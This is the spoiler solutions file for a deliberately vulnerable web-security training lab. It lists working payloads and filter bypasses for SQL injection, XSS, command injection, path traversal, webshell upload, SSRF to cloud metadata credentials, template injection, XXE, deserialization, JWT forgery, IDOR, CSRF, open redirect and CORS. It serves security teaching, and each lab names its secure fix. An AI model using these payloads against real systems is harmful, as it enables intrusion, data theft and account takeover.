# Solutions

Spoilers for every lab. Try the Hints tab first — this file is for checking
your work or getting unstuck. The goal of each lab is to produce a **real
effect** (read the planted secret, be accepted as admin), which is how the
workbench detects a solve.

The secret planted for file-read and RCE labs is
`/opt/forge/flag.txt` → `FORGE-SECRET{real_server_side_read_2f9c}`.

You can solve everything from the built-in Attack Console. `GET` payloads go in
the path; `POST` bodies go in the Body field.

---

## SQL Injection

### Product Search — UNION extraction (`sqli-search`)
Parameter `q`.
- **Low:** `?q=zz' UNION SELECT 1,username,password_md5,4 FROM users -- -`
- **Medium:** filter strips lowercase `union`/`select`; use mixed case:
  `?q=zz' UNION SELECT 1,username,password_md5,4 FROM users -- -`
- **High:** filter is case-insensitive but single-pass; nest the keywords:
  `?q=zz' UNunionION SELselectECT 1,username,password_md5,4 FROM users -- -`
- **Secure:** parameterized; not exploitable.

### Login — auth bypass (`sqli-login`)
Body `username`, `password`.
- **Low:** `username=admin' -- -&password=x`
- **Medium:** comments stripped; no comment needed:
  `username=admin' OR '1'='1&password=x`
- **High:** `OR` keyword stripped; use MySQL `||`:
  `username=admin'||'1'='1&password=x`
- **Secure:** parameterized lookup + hash check; not exploitable.

### Username Check — blind / time-based (`sqli-blind`)
Parameter `username`. Solve = the response is delayed by a real `SLEEP`.
- **Low:** `?username=alice' AND SLEEP(2) -- -`
- **Medium:** `SLEEP` stripped case-sensitively; lowercase works:
  `?username=alice' AND sleep(2) -- -`
- **High:** case-insensitive single-pass removal; nest it:
  `?username=alice' AND SLsleepEEP(2) -- -`
- **Secure:** parameterized; timing never varies.

---

## Cross-Site Scripting

### Search Box — reflected (`xss-reflected`)
Parameter `q`.
- **Low:** `?q=<script>alert(1)</script>`
- **Medium:** `<script>` stripped; use a handler: `?q=<img src=x onerror=alert(1)>`
- **High:** input is in an attribute, angle brackets stripped; break out with a
  quote and add a handler: `?q=" autofocus onfocus="alert(1)`
- **Secure:** `htmlspecialchars(ENT_QUOTES)`; not exploitable.

### Product Reviews — stored (`xss-stored`)
Body `comment`. POST, then reload the feature.
- **Low:** `comment=<script>alert(1)</script>`
- **Medium:** `comment=<img src=x onerror=alert(1)>`
- **High:** only a few tags allowed; an `<a>` keeps a javascript URL:
  `comment=<a href="javascript:alert(1)">click</a>`
- **Secure:** encoded on output; not exploitable.

### Theme Preview — DOM-based (`xss-dom`)
Type into the Theme field in the live pane and Apply. Call the provided
`forgeSolve()` from your payload.
- **Low:** `<img src=x onerror=forgeSolve()>`
- **Medium:** `<script>` pattern removed; `<svg onload=forgeSolve()>`
- **High:** `on<word>=` removed when contiguous; add whitespace:
  `<img src=x onerror = forgeSolve()>`
- **Secure:** `textContent`; not exploitable.

---

## OS Command Injection — Network Tools (`cmdi-ping`)
Parameter `host`.
- **Low:** `?host=127.0.0.1; cat /opt/forge/flag.txt`
- **Medium:** `;`, `&`, `|` stripped; use a newline (URL-encoded `%0a`) or `$(...)`:
  `?host=127.0.0.1%0acat /opt/forge/flag.txt`
- **High:** longer blacklist, but a newline still separates commands:
  `?host=127.0.0.1%0acat /opt/forge/flag.txt`
- **Secure:** `escapeshellarg` + allowlist; not exploitable.

---

## Path Traversal / LFI — Document Viewer (`lfi-docs`)
Parameter `doc`. The docs folder is deep, so use six `../`.
- **Low:** `?doc=../../../../../../opt/forge/flag.txt` (or `/etc/passwd`)
- **Medium:** single `../` removed; nest: `?doc=....//....//....//....//....//....//opt/forge/flag.txt`
- **High:** `../` fully removed, but wrappers work with an absolute path:
  `?doc=php://filter/resource=/opt/forge/flag.txt`
- **Secure:** basename + extension allowlist + realpath containment; not exploitable.

---

## File Upload — Avatar Webshell (`upload-avatar`)
Multipart POST. The default request carries a webshell; Send it, then request
the returned `/uploads/...` path with `?c=<command>`.
- **Low:** `filename="shell.php"`; then `GET /uploads/shell.php?c=cat /opt/forge/flag.txt`
- **Medium:** Content-Type checked; set the part's `Content-Type: image/png`
  while keeping `filename="shell.php"`.
- **High:** extension blacklist misses `.phtml`; use `filename="shell.phtml"`.
- **Secure:** image content verified, random name; not exploitable.

---

## SSRF — Link Preview (`ssrf-preview`)
Parameter `url`. Targets: `http://internal-api/` and the metadata service.
- **Low:** `?url=http://internal-api/`
- **Medium:** loopback and the literal metadata IP blocked; use the name or decimal:
  `?url=http://metadata/latest/meta-data/iam/security-credentials/forge-role`
- **High:** names and `169.254` blocked as text; use the decimal IP, which
  resolves to the same host:
  `?url=http://2852039166/latest/meta-data/iam/security-credentials/forge-role`
- **Secure:** resolves the host and rejects private/reserved ranges; not exploitable.

---

## Server-Side Template Injection — Greeting (`ssti-greeting`)
Parameter `tpl`. Confirm with `?tpl=Hello {{7*7}}` → `Hello 49`.
- **Low:** `?tpl={{system('cat /opt/forge/flag.txt')}}`
- **Medium:** command functions blocked; read the file:
  `?tpl={{file_get_contents('/opt/forge/flag.txt')}}`
- **High:** more blocked, but `file()` remains:
  `?tpl={{implode('',file('/opt/forge/flag.txt'))}}`
- **Secure:** only named variables substituted, no eval; not exploitable.

---

## XXE — Product Import (`xxe-import`)
POST an XML body with `Content-Type: application/xml`.
- **Low:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE p [<!ENTITY xxe SYSTEM "file:///opt/forge/flag.txt">]>
  <product><name>&xxe;</name></product>
  ```
- **Medium:** `SYSTEM` filtered; use `PUBLIC`:
  `<!ENTITY xxe PUBLIC "x" "file:///opt/forge/flag.txt">`
- **High:** `file://` filtered; use a scheme-less absolute path:
  `<!ENTITY xxe SYSTEM "/opt/forge/flag.txt">`
- **Secure:** no DTD/entity processing; DOCTYPE rejected.

---

## Insecure Deserialization — Theme Cookie (`deser-prefs`)
Send a `prefs` cookie (base64 of a serialized `Preferences` with
`debugLog=/opt/forge/flag.txt`). Generate the payload in PHP:
```php
require 'Preferences.php';
$p = new Preferences(); $p->debugLog = '/opt/forge/flag.txt';
echo base64_encode(serialize($p));          // for Low / Secure
echo base64_encode(serialize([$p]));        // array-wrapped, for Medium / High
```
- **Low:** send the object payload as the `prefs` cookie.
- **Medium:** top-level `O:` rejected; send the array-wrapped payload.
- **High:** only `Preferences` allowed, but it is the gadget; send the
  array-wrapped payload.
- **Secure:** `allowed_classes=false`; no object is built.

---

## JWT Forgery — Session Token (`jwt-session`)
Send `Authorization: Bearer <token>` with `{"role":"admin"}`.
- **Low:** `alg:none`, empty signature:
  `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.`
- **Medium:** HS256 with secret `secret`. Sign your admin claims with it
  (jwt_tool, or `openssl dgst -sha256 -hmac secret`).
- **High:** HS256 with secret `forge-2026` (crackable, e.g. hashcat `-m 16500`).
- **Secure:** 32-byte random secret, HS256 pinned; not forgeable.

---

## IDOR — Invoices (`idor-invoice`)
You are alice (uid 2). The admin invoice is id 1.
- **Low:** `?id=1`
- **Medium:** id is base64; `?id=MQ==` (base64 of `1`)
- **High:** ownership checked against a request param; claim it: `?id=1&as=1`
- **Secure:** scoped to the session user; not exploitable.

---

## Mass Assignment — Profile (`massassign-profile`)
POST body.
- **Low:** `email=a@b.c&role=admin`
- **Medium:** key `role` blacklisted but columns are case-insensitive:
  `email=a@b.c&ROLE=admin`
- **High:** `role` blocked case-insensitively, but `balance` is still bindable:
  `email=a@b.c&balance=999999`
- **Secure:** allowlist (`bio`, `email` only); not exploitable.

---

## CSRF — Change Email (`csrf-email`)
Issue a forgeable state change. The Report tab has a self-submitting PoC.
- **Low:** no token: `POST` with body `email=attacker@evil.example`
- **Medium:** static token: add `&csrf_token=csrf-static-123`
- **High:** blank Referer allowed; send the POST with an empty `Referer:` header
  and no token.
- **Secure:** per-session token required; not forgeable.

---

## Open Redirect — Post-Login (`open-redirect`)
Parameter `next`. Solve = the `Location` points off-site (use `evil.example`).
- **Low:** `?next=https://evil.example/`
- **Medium:** must start with `/`; use protocol-relative: `?next=//evil.example/`
- **High:** `//` blocked; use a backslash (browsers normalize it): `?next=/\evil.example`
- **Secure:** allowlisted relative paths only; not exploitable.

---

## CORS — Account API (`cors-api`)
Send an `Origin` header; check `Access-Control-Allow-Origin` in the response.
- **Low:** `Origin: https://evil.example` (reflected with credentials)
- **Medium:** suffix check; `Origin: https://evil-forgeshop.local`
- **High:** substring check; `Origin: https://forgeshop.local.evil.example`
- **Secure:** exact allowlist; untrusted origin not reflected.
